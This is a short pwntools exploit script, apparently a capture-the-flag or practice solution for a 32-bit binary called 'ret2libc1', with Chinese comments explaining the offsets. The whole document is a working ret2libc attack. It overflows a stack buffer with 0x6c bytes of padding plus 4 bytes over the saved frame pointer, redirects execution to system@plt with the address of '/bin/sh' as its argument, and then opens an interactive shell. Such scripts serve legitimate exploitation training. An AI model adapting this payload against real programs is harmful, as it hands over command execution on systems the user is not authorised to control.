from pwn import *

sh = process("./ret2libc1")

offset = 0x6c
sys_plt = 0x08048460
bin_plt = 0x08048720
#offset 0x6c是s到栈顶esp的距离
#0x4是ebp的长度,覆盖4字节的垃圾数据“b”,32位程序都是4个字节,64是8个
#sys_plt system函数地址
#随意一个4字节数
#bin_plt bin/sh地址
payload = b"a"*offset + b"b"*0x4 + p32(sys_plt) +  b"c"*0x4 +p32(bin_plt)

sh.sendline(payload)

sh.interactive()